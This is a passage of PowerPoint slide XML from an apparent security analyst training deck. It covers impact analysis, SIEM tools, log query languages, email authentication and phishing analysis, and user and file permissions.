            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Post-mortem</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Determines immediate and ongoing impact of a threat that has already been realized</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98</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IMPACT ANALYSIS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Impact Analysis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Immediate (localized) impact</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Long-term impact</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  What’s the total impact to the organization?</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99</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IMPACT ANALYSIS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Impact Analysis (3)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Availability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Tends to have immediate impact</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Secure systems guarantee confidentiality, integrity, and availability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Use resource monitoring tools to analyze</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Early indicator of an attack</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100</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COLLECTIVE TOOLS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SIEMs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A Security Information and Event Management (SIEM) system centrally collects, stores, analyzes, correlates, and reports on log and event data gathered from across an environment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It normalizes data from disparate log formats into a common structure so events from firewalls, servers, endpoints, and applications can be compared and correlated to surface incidents and generate alerts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Common products and platforms include ArcSight, IBM QRadar, Splunk, AlienVault OSSIM, Kiwi Syslog, and the open-source ELK stack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The SIEM is the central nervous system of a SOC, giving analysts a single pane of glass for detection, correlation, investigation, and compliance reporting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect to identify the SIEM's core functions (collect, normalize, correlate, alert, report) and to recognize named products, and to know normalization is what makes cross-source correlation possible.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101</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COLLECTIVE TOOLS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SIEMs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Security information &amp; event management systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Collect, store, analyze, &amp; report data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Normalize data from various logs &amp; compare</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  ArcSight</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  QRadar</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Splunk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Alienvault</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  OSSIMKiwi Syslog</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  ELK</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102</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QUERY WRITING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Query Writing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Query writing is the skill of constructing search expressions that pull specific data out of logs, databases, and SIEM indexes so an analyst can investigate activity efficiently.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Different platforms use different query languages: SQL is the most common for relational databases, Splunk uses its Search Processing Language (SPL), Kibana in the ELK stack uses the Kibana Query Language (KQL) built on Apache Lucene syntax, and simple text searches use tools like grep.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The command grep (globally search a regular expression and print) searches text files for string and regex matches, fetches the matching data, and lets you pipe that output into further commands or scripts for automated processing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst who can write precise queries can hunt threats, filter noise, and extract exactly the evidence needed during an investigation instead of manually reading raw logs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions match a platform to its query language (Splunk/SPL, Kibana/KQL-Lucene, database/SQL) and test using grep and regular expressions to filter log text.</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103</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QUERY WRITING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Query Writing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SQL (Structured Query Language)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Most common</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Splunk Search Processing Language (SPL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Kibana Query Language (KQL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Apache Lucene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104</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QUERY WRITING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Query Writing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Simple queries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  grep</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Stands for get regular expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Search text files (string search), fetch data, pipe out data however you want</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Write scripts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Useful for avoiding excessive typing</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105</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EMAIL ANALYSIS, PART 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E-mail Analysis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E-mail analysis is the examination of messages for signs of phishing, impersonation, and malicious payloads by inspecting the header, embedded links, attachments, and the message's authentication results.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Three authentication mechanisms work together: Sender Policy Framework (SPF) checks that the sending server is authorized to send for the domain, DomainKeys Identified Mail (DKIM) adds a cryptographic digital signature verifying the message was not altered, and Domain-based Message Authentication, Reporting, and Conformance (DMARC) ties SPF and DKIM together with a published policy and alignment check plus reporting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts read message headers to trace the true origin and forwarding path, and scrutinize embedded links and encryption/signature status to detect spoofing and impersonation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC prioritizes email analysis because email is the leading initial-access vector, so catching a spoofed sender or malicious link stops many attacks at the entry point.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect to explain what SPF, DKIM, and DMARC each verify and to analyze email headers to determine whether a message is spoofed or phishing.</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106</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EMAIL ANALYSIS, PART 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E-mail Analysis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Malicious payload</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  DomainKeys Identified Mail (DKIM)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Sender Policy Framework (SPF)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Domain-Based Message Authentication, Reporting, and Conformance (DMARC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Header</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phishing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Forwarding</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Digital signatures and encryption</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107</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EMAIL ANALYSIS, PART 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E-mail Analysis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Embedded links</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Impersonation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  E-mail signature block</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It’s critical for your users to understand that a digital signature is not the same as the signature block routinely used in outgoing messages.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Signature block content is simply additional text that is automatically or manually inserted with messages to enable users to share contact information.</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108</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EMAIL ANALYSIS, PART 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E-mail Analysis (3)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It offers no security advantage, whereas a digital signature provides verification of the sender’s authenticity and message integrity.</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109</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EMAIL ANALYSIS, PART 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E-mail Analysis (4)</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Malicious payload</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  DomainKeys Identified Mail (DKIM)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Sender Policy Framework (SPF)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Domain-Based Message Authentication, Reporting, and Conformance (DMARC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Header</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phishing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Forwarding</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Digital signatures and encryption</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110</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EMAIL ANALYSIS, PART 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E-mail Analysis (5)</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Embedded links</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Impersonation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  E-mail signature block</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It’s critical for your users to understand that a digital signature is not the same as the signature block routinely used in outgoing messages.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Signature block content is simply additional text that is automatically or manually inserted with messages to enable users to share contact information.</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111</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EMAIL ANALYSIS, PART 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E-mail Analysis (6)</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It offers no security advantage, whereas a digital signature provides verification of the sender’s authenticity and message integrity.</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112</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PERMISSIONS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Permissions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Permissions define which users and groups are allowed to access which files and resources and what actions they may perform, enforcing least privilege across a system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst first identifies the relevant users and groups, then sets access rights on the target files and resources, and can apply allow-and-deny controls such as a blacklist that denies specific traffic or applications and a whitelist that permits only approved ones.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On Windows these settings are commonly managed centrally through the Group Policy Editor, which pushes consistent permission and access policies across many machines.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Proper permission management matters to a SOC because misconfigured or excessive permissions are a frequent cause of privilege escalation and data exposure.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests applying least privilege by assigning permissions to users/groups and distinguishing allow-list (whitelist) from deny-list (blacklist) control, often via Group Policy.</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113</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PERMISSIONS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Permissions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Identify:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Users</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Groups</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Set permissions for:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Resources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114</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PERMISSIONS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Permissions Demo</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Windows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
